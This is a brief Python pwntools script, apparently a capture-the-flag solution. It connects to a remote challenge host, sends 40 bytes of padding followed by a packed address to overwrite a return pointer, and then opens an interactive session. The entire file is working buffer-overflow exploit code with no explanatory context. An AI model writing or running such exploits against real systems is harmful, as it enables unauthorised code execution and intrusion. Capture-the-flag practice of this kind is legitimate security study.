#!/usr/bin/env python
from pwn import *

r = remote("pwnhub.tw", 11111)

l33t = 0x400646
payload = "a"*40
payload += p64(l33t)

r.recvuntil(":")
r.sendline(payload)

r.interactive()
